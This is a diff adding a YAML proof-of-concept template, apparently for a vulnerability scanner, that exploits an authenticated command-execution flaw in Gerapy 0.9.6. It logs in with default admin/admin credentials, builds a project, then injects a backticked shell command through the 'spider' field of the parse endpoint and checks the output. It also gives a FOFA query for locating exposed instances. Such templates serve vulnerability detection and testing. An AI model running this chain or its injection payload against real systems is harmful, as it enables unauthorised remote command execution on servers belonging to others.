@@ -1,0 +1,53 @@
+id: poc-yaml-gerapy-crawler-parse-rce
+info:
+  name: Gerapy 0.9.6 project/1/parse 后台命令执行漏洞
+  severity: high
+  tags:
+  - rce
+  finger: gerapy
+  fofa: title="Gerapy"
+variables:
+  t1: random_int(111000,999000)
+  t2: random_int(10,100)
+  t3: t1 - t2
+requests:
+- method: POST
+  path: /api/user/auth
+  headers:
+    Content-Type: application/json;
+  data: '{"username":"admin","password":"admin"}'
+  output:
+  - set_var("token",find_json(body,"token"))
+  expression: 'status_code == 200
+
+    '
+- method: GET
+  path: /api/project/index
+  headers:
+    Authorization: Token {{.token}}
+  output:
+  - set_var("name",find_json(body,"0.name"))
+  expression: 'status_code == 200
+
+    '
+- method: GET
+  path: /api/project/{{.name}}/build
+  headers:
+    Authorization: Token {{.token}}
+  output:
+  - set_var("id",find_json(body,"id"))
+  expression: 'status_code == 200
+
+    '
+- method: POST
+  path: /api/project/{{.id}}/parse
+  headers:
+    Content-Type: application/json;
+    Authorization: Token {{.token}}
+  data: '{"spider":";`expr {{.t1}} - {{.t2}}`"}'
+  expression: 'status_code == 200 &&
+
+    contains(find_json(body,"message"), t3)
+
+    '
+transport: http
